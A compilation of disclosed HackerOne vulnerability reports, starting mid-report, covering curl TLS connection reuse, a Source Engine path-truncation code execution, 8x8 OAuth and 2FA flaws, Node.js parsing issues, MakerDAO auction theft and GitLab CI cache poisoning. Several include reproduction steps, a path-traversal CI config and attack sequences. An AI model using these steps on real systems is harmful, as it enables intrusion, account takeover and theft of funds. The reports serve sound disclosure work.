3. Similarly, the function has an implementation flaw where path names use case-insensitive comparison for capath, cainfo and pinned public key paths. This can lead to a  situation where if the attacker can specify the capath, cainfo or pinned public key name that have a different path capitalization. Again, if the attacker can specify some of these values for the connection that is performed before the later supposedly secure connection is made, the attacker is able to make the further connection use incorrect capath, cainfo or pinned public key. This is CWE-41 `Improper Resolution of Path Equivalence`.
4. Finally, the pinned public key fingerprint set by `CURLOPT_PINNEDPUBLICKEY` `sha256//` is incorrectly compared as case-insenstive  value. If the attacker is able to create a otherwise valid certificate that has a fingerprint that has the same fingerprint string but with different capitalization (very difficult to pull off in practice), and the application could be tricked to use this value for `CURLOPT_PINNEDPUBLICKEY` and create a connection, later connection could be confused to think that the pinned public key is the same one.

Exploiting any of these issues requires a situation where the attacker can coax the application to create a TLS connection to the same host and port that will be performed by the application itself later on (for example some backend connection or other high security connection the attacker wishes to man in the middle). In these situations the existing connection with less security guarantees may be reused, allowing man in the middle attacks against the later supposedly secure connection, resulting in loss of confidentiality and integrity. Since this requires an active attack it can't be thought to have direct availability impact. In most cases where this would result in exploitation would be scenarios where there would be a privilege barrier between the user providing the connection target addresses  (lower priority) and the libcurl using application performing the actual connections (higher priority). It can also be exploitable in a scenario where the attacker will try to man in the middle connections performed by other users of the same service (lateral attack towards users at the same privilege level).

Exploiting the first two issues is plausible in a situation where the attacker can obtain a valid certificate for the host, but from issuer that doesn't match what the application pinning will check for. If the app uses the blob variants to set up pinning and the attacker is able to obtain a certificate for the specific host from for example Let's Encrypt, the "pin stripping" attack would be plausible.

Exploiting the 3rd issue is be possible in a situation where the attacker can write to a location that has the same path but with a different capitalization. One example of such situation would be an application that uses a `/tmp`, `/dev/shm` or similar sticky world writable location to store the capath/cainfo/pinned public key file. The attacker would then be able to use the same location but with different file name capitalization to fool the application to reuse the existing connection for later connections that actually would use a different capath, cainfo or pinned public key. This attack requires that the attacker can provide the options for capath, cainfo or the public cert pinning somehow (the application would need to enable this as part of its normal functionality).

## Steps To Reproduce:

This proof of concept demonstrates the 3rd issue with the curl tool:
  1. `cp /etc/ssl/certs/ca-certificates.crt ca.crt`
  2. `touch CA.crt`
  3. `curl --capath /dev/null --cacert $PWD/ca.crt  https://curl.se --next --capath /dev/null --cacert $PWD/CA.crt  https://curl.se`

If `Curl_ssl_config_matches` comparison is implemented correctly the 2nd connection should fail.

## Proposed Fix:
In Curl_ssl_config_matches:
- Add "blob" binary matching for `CURLOPT_CAINFO_BLOB` and `CURLOPT_ISSUERCERT_BLOB`
- Add case-sensitive matching for `CURLOPT_ISSUERCERT` value
- Use case-sensitive matching for paths and public key cert signature(s)
- Ensure that there are no other SSL parameters that are improperly compared or omitted from the equivalence check

## Impact

TLS man in the middle

---

### [[Source Engine] Material path truncation leads to Remote Code Execution](https://hackerone.com/reports/544096)

- **Report ID:** `544096`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** Valve
- **Reporter:** @nyancat0131
- **Bounty:** 2500 usd
- **Disclosed:** 2021-05-06T16:16:45.035Z
- **CVE(s):** -

**Summary (team):**

Title:         [Source Engine] Material path truncation leads to Remote Code Execution
Scope:         *.exe
Weakness:      Improper Input Validation
Severity:      High (7.1)
Link:          https://hackerone.com/reports/544096
Date:          2019-04-20 12:18:09 +0000
By:            @nyancat0131

Details:
## Summary

The handler of `mat_crosshair_edit` command supplies a buffer of size `256` for material path.
That function will call `vgui2::system()->ShellExecute("open", path);` to open the `.vmt` file in associated editor if available.
But in windows, `MAX_PATH` is `260`.
So path truncation can be abused to trick the command to execute file of another extension.
I choose `.js` extension since it is associated with Windows Script Host by default, and it is not blocked by Source Engine download filter.

## Affects
CS:Source, CS:GO, and maybe all Valve's Source Engine games.

## Environment for reproduction

- Windows 10 x64 10.0.17763.437
- CS:Source installed at default location: `C:\Program Files (x86)\Steam\steamapps\common\Counter-Strike Source\`

NOTE: CS:Source must be installed at that path for this PoC to work.

## Steps to reproduce

- Download F472693, extract it to `C:\Program Files (x86)\Steam\steamapps\common\Counter-Strike Source\cstrike\download\`
- Start CS:Source
- Type in the console `map aim_path` and wait for the map to load
- Type in the console `sv_cheats 1`
- Type in the console `mat_crosshair_edit` and `calc.exe` will be executed

## Impact

Since the engine has filter for `ClientCommand` function on the server, attacking without user interaction is almost impossible. The only way to pass the filter is to brute force cmd marker random number, which is 1 in 2^19.
Once the victim has triggered the bug, attacker can run arbitrary commands on victim's computer.

---

### [2FA Disable With Wrong Password - Response Tampering.](https://hackerone.com/reports/893085)

- **Report ID:** `893085`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** 8x8
- **Reporter:** @the_predator
- **Bounty:** - usd
- **Disclosed:** 2020-10-21T05:08:53.493Z
- **CVE(s):** -

**Summary (team):**

The application contained a business logic flaw that resulted in missing validation when removing 2FA on the authenticated account.

---

### [Send Phishing/Spam email from support@sameroom.io to any email address.](https://hackerone.com/reports/840688)

- **Report ID:** `840688`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** 8x8
- **Reporter:** @wisp
- **Bounty:** - usd
- **Disclosed:** 2020-08-05T22:34:26.554Z
- **CVE(s):** -

**Summary (team):**

The Sameroom API contained an endpoint to generate an email to notify the user that the account had been updated. This API request utilized a JSON body that specified the email address and DisplayName of the user without validating the format or characters of the DisplayName. An attacker could have utilized the endpoint to craft convincing spam emails that originated from the Sameroom server.

---

### [Insecure OAuth redirection at [admin.8x8.vc]](https://hackerone.com/reports/770548)

- **Report ID:** `770548`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** 8x8
- **Reporter:** @hundredpercent
- **Bounty:** - usd
- **Disclosed:** 2020-04-10T18:00:40.674Z
- **CVE(s):** -

**Summary (team):**

The meetings admin application performed an insufficient validation of the specified redirect location during OAuth negotiation.

**Summary (researcher):**

There was an improper redirection in "admin.8x8.vc" oauth that lead to takeover the admin.8x8.vc SSO accounts ,
When trying to adding an admin account in admin.8x8.vc you'll get a redirection to make authentication with your gmail account, and this redirection was not validated ,which leak the code token to whatever domain,, hacker have the ability to use these codes to log into the victim's account

* Vulnerable parameter : successRedirectUrl >> was accepting any domain to send the oauth secret login codes

---

### [HTTP header values do not have trailing OWS trimmed](https://hackerone.com/reports/730779)

- **Report ID:** `730779`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** Node.js
- **Reporter:** @alyssawilk
- **Bounty:** - usd
- **Disclosed:** 2020-02-24T17:48:42.993Z
- **CVE(s):** CVE-2019-15606

**Vulnerability Information:**

[I suspect I may have tagged the wrong vulnerability type -I'm failing to find "insufficient validation of user input"]

According to the HTTP-spec, http values are
       field-value    = *( field-content | LWS )
http_parser does not appear to trim trailing LWS. This means if a user sends "Host: foo\r\n" the string literal "foo" is passed up, but if the user sends "Host: foo \r\n" the string literal "foo " is passed up, complete with trailing LWS.

## Steps To Reproduce:

(Add details for how we can reproduce the issue)

If one hands "GET / HTTP/1.1\r\nHost: foo.com \r\nHello: World\r\n\r\n"
to http_parser, http_parser sends on_header_value "foo.com " instead of "foo.com"

## Impact: [add why this issue matters]

We are trying to address an issue with Envoy, where if 
"GET / HTTP/1.1\r\nHost: my-super-private-domain.com \r\nHello: World\r\n\r\n"
is passed to Envoy, and Envoy is configured to block any requests to "my-super-private-domain.com", the matcher fails due the trailing whitespace, and external users can tunnel requests that should be blocked.

Originally we were going to address this by doing whitespace trimming in Envoy, but this should probably be fixed upstream in http_parser in case other users are affected, so we're reaching out to see what folks on your end think.

## Supporting Material/References:

My Envoy regression test verifies this lack of LWS trimming, but this is current under envoy security embargo, so please don't share

TEST_F(Http1ServerConnectionImplTest, LWS) {                                                         
  initialize();                                                                                      
                                                                                                     
  InSequence sequence;                                                                               
                                                                                                     
  Http::MockStreamDecoder decoder;                                                                   
  EXPECT_CALL(callbacks_, newStream(_, _)).WillOnce(ReturnRef(decoder));                             
                                                                                                     
  TestHeaderMapImpl expected_headers{                                                                
      {"Test", "value "},      // note the LWS after value is passed up from http_parser to Envoy :-(                                                                       
      {"Hello", "World"},                                                                            
      {":path", "/"},                                                                                
      {":method", "GET"},                                                                            
  };                                                                                                 
  EXPECT_CALL(decoder, decodeHeaders_(HeaderMapEqual(&expected_headers), true)).Times(1);            
                                                                                                     
  Buffer::OwnedImpl buffer("GET / HTTP/1.1\r\nTest: value \r\nHello: World\r\n\r\n");                
  codec_->dispatch(buffer);                                                                          
  EXPECT_EQ(0U, buffer.length());                                                                    
}

## Impact

As said above, this could allow privileged escalation, where if one uses an http_parser  enabled server configured to block specific domains, those blocks can be trivially bypassed using white-space. It's possible there are other attacks bypassing http_parser header value checks with whitespace, but I haven't investigated beyond the most obvious exploit

---

### [[url-parse] Improper Validation and Sanitization](https://hackerone.com/reports/496293)

- **Report ID:** `496293`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** Node.js third-party modules
- **Reporter:** @ronperris
- **Bounty:** - usd
- **Disclosed:** 2020-01-27T09:10:53.941Z
- **CVE(s):** CVE-2020-8124

**Vulnerability Information:**

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

I would like to report Improper Validation and Sanitization in url-parse.

It allows attacker-controlled URL values to bypass validation and sanitization.

# Module

**module name:** url-parse
**version:** 1.4.4
**npm page:** `https://www.npmjs.com/package/url-parse`

## Module Description

The url-parse method exposes two different API interfaces. The url interface that you know from Node.js and the new URL interface that is available in the latest browsers.

## Module Stats

> Replace stats below with numbers from npm’s module page:

5,544,078 downloads in the last week

# Vulnerability

## Vulnerability Description

When using url-parse in the browser the protocol of the URL returned by the parser is not validated correctly. In the Node.js environment strings like, ` javascript:` return and empty string on the resulting URL object, but in the browser the current `document.location.protocol` is used when the provided URL doesn't match the validation expression `/^([a-z][a-z0-9.+-]*:)?(\/\/)?([\S\s]*)/i`.

## Steps To Reproduce:

Add the following `test to test/test.js` and run `npm run test-browser`.

 assume(parse.extractProtocol(' javscript:')).eql({
        slashes: false,
        protocol: '',
        rest: ''
      })

# Wrap up
Line 199 in index.js is setting the protocol to location.protocol, this is probably not the right move.

url protocol = extracted.protocol || location.protocol || '';

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y] 
- I opened an issue in the related repository: [N]

## Impact

Bypass input sanitization and validation.

---

### [Steal ALL collateral during liquidation by exploiting lack of validation in `flip.kick`](https://hackerone.com/reports/684092)

- **Report ID:** `684092`
- **Severity:** Critical
- **Weakness:** Improper Input Validation
- **Program:** BlockDev Sp. Z o.o
- **Reporter:** @lucash-dev
- **Bounty:** - usd
- **Disclosed:** 2019-10-01T16:51:29.387Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The `flip` contract allows for the MCD system to auction collateral in exchange for DAI.
A lack of validation in the method `flip.kick` allows an attacker to create an auction with a fake
bid value. Since the `end` contract trusts that value, it can be exploited to issue any amount of free
DAI during liquidation. That DAI can then be immediately used to obtain all collateral stored in the
`end` contract.

## Detailed Description:

The `flipper` contract (`flip.sol`) is intended to offer a way for the MCD contracts to obtain DAI by auctioning gems. An auction is initiated by calling the `flip.kick` method, which is normally done by the `cat` contract when it grabs collateral from a CDP.

The implementation of that method, however, completely lacks access control and has very little validation -- in particular, it's possible to execute the method even during the liquidation phase.
On top of that, all values stored in the auction are accepted as parameters of the method, including the bid amount. By directly calling the method, a malicious user can create a "fake" auction, with an arbitrary initial bid value, without spending the corresponding DAI.

Though that technique could be used to cause other damage, I will focus this report on the maximum-impact effect by exploiting it during the liquidation phase, in an attack vector that leads to transferring all collateral to the attacker.

First, the system must be in the liquidation phase, after `end.flow` is called to fix the exchange rate for redeeming collateral. Then the attacker performs three actions as follows:

1. Create a "fake" auction, by calling `flip.kick`. The bid parameter of the method can be set to any arbitrarily large value, in special a value at least equal to the total supply of DAI. The `lot` parameter, on the other hand, can be arbitrarily small, as long as it's not zero.

2. The attacker calls `end.skip`. The `end` contract will try to return the `bid` amount to the attacker. This will result in the issuance -- for free -- of DAI to the attacker, in any amount entered during step 1.

3. The attacker calls `end.pack` and `end.cash` thus converting the DAI into collateral. If the amount entered in step 1 is the total supply of DAI, the attacker will obtain ALL collateral stored in the `end` contract.

## Steps To Reproduce:
I've attached to this report a modified version of `end.t.sol` which contains a test (`test_steal_all_collateral_using_flipper`) that reproduces the attack.

Please don't hesitate to contact me if you need help understanding the test or reproducing the issue.

## Impact

The issue described in this report allows an attacker to steal ALL collateral stored in the MCD system during the liquidation phase -- possibly within a single transaction. This would result in a complete loss of funds for all users.
The cost of performing the attack is almost zero -- just the minimal denomination of each type of gem stolen plus gas.

Given the above I understand the issue has Critical severity, and fully qualifies for the corresponding bounty.

---

### [Steal all MKR from `flap` during liquidation by exploiting lack of validation in `flap.kick`](https://hackerone.com/reports/684152)

- **Report ID:** `684152`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** BlockDev Sp. Z o.o
- **Reporter:** @lucash-dev
- **Bounty:** - usd
- **Disclosed:** 2019-09-26T15:34:59.756Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The `flap` contract provides the ability to auction DAI for MKR. That's a fundamental functionality of the MCD system, invoked usually from the `vow` contract.
A flaw in the validation of calls to `flap.kick`, however, allows a malicious user to create "fake' auctions that can be later used to steal MKR from `flap` during the liquidation (`end`) phase.

## Detailed description

The method `flap.kick`, used to start an auction of DAI (for MKR) in the `flap` contract, lacks any validation of the `bid` parameter. Since the method is public, a malicious user can directly invoke it, passing an arbitrary `bid` parameter -- affecting other contracts that assume this value represents the highest bid in the auction.

While it's possible that this issue will cause other problems, in this report I'll focus on what seems to be the highest severity attack enabled by it.

The attack consists of two parts:

1 - During the normal operation of the MCD system (contracts not "caged"), the attacker will create one or more "fake" auctions by calling `flap.kick`. The `bid` parameter can be arbitrarily large, and won't be validated in any way. On the other hand, the `lot` parameter can be arbitrarily small, as long as it's not zero, which means the auction can be placed with almost zero cost.

2 - After governance calls `end.cage`, the auctions are stopped -- but any MKR deposited in the `flap` contract for any outstanding auction will still be there until someone calls `yank` for each one.
At this point, the attacker can call `flap.yank` for his own "fake" auctions, and that will result in him getting MKR transferred from the `flap` contract to himself -- in whatever amount was specified as `bid` in step 1.

Since the attacker might no know beforehand, it would be wise for them to create multiple "fake" auctions. In particular, an exponential series of auctions, with `bid` values 1, 2, 4, 8, 16... will allow the attacker to extract any exact amount of MKR from the `flap` contract.


## Steps To Reproduce:
I've attached to this report a modified version of `end.t.sol` which contains a test (the last one, `test_steal_mkr_from_flapper`) that reproduces this attack.

Please don't hesitate to contact me if you have any trouble understanding or reproducing this issue.

## Impact

This issue allows an attacker to steal arbitrary amounts of MKR deposited for auction.
That impact is particularly troubling, as MKR tokens are used to govern the platform, and anyone maliciously obtaining large quantities of these tokens might use them to further affect other core functionalities, potentially leading to stealing collateral, DAI etc. Also, because the same MKR token might be used for governance of future versions of the contracts, the damage might be much more enduring and harder to mitigate.

Given the above, and the minimal cost for perpetrating the attack, this issue would normally be classified as Critical. The specific policies for this program, though, won't allow for that, since this attack doesn't steal collateral directly. So, I classified the severity as High.

---

### [Bypass of GitLab CI runner slash fix in YAML validation](https://hackerone.com/reports/409395)

- **Report ID:** `409395`
- **Severity:** Critical
- **Weakness:** Improper Input Validation
- **Program:** GitLab
- **Reporter:** @ngalog
- **Bounty:** - usd
- **Disclosed:** 2019-04-10T04:33:42.240Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Gitlab Security,

I notice the bug #301432 that Jobert reported earlier is could be bypassed by setting variable in environment.

The reason is that the fix in place preventing url normalization is performed by doing the YAML  validation, however this could be bypassed by setting the environment variable in `https://gitlab.com/{project_id}/settings/ci_cd`

By setting the key ONE and variable value to `../1/key`, it is possible to replicate what jobert did in #301432.

And in `.gitlab-ci.yml`

```
a:
  script:
  - echo "script"
  - echo "a"
  cache:
    key: "$ONE"
    policy: pull #or push if you like to poison
    paths:
      - .
```

Then make any change to `.gitlab-ci.yml` will trigger the bug once again.

Download from cache
{F345819}
Setting environment variable
{F345820}
Upload to cache
{F345821}

## Impact

Quoting from  #301432
```
Depending on the files that are cached, this may allow an attacker to run arbitrary code on a victim's Docker instance running a CI run. This may expose confidential data, inject artifacts in a build pipeline to ship additional code, among other things.
```

---

### [Improper UUID validation results in bypass of #419896](https://hackerone.com/reports/423073)

- **Report ID:** `423073`
- **Severity:** High
- **Weakness:** Improper Input Validation
- **Program:** HackerOne
- **Reporter:** @popeax
- **Bounty:** - usd
- **Disclosed:** 2018-10-25T22:38:41.919Z
- **CVE(s):** -

**Vulnerability Information:**

This was found while evaluating the vulnerability and patch identified in #419896.  I determined the deployed patch to be effective.  However, I noticed tracer values could be sent which didn't conform to the UUID specification as characters outside of the a-f and 0-9 ranges could be used.  For example, a value such as "zzzzzzzz-zzzz-zzzz-zzzz-zzzzzzzzzzzzzz" was accepted by the server as valid.  Likely this indicates a problem with a regex filter that needs to be slightly changed.  

Steps
1. Navigate to a program which allows anonymous submissions.
2. Open the report submission form and add an attachment.
3. Observe the request sent to /attachments includes a client side generated UUID in the tracer field.
4. Replay the request from step 3.  Use an invalid UUID (e.g. "zzzzzzzz-zzzz-zzzz-zzzz-zzzzzzzzzzzzzz") for the tracer and observe the server accepts the value.

## Impact

The impact is unknown, but it is believed to have a cascading side effect.  I was asked to submit this by @jobert.

---
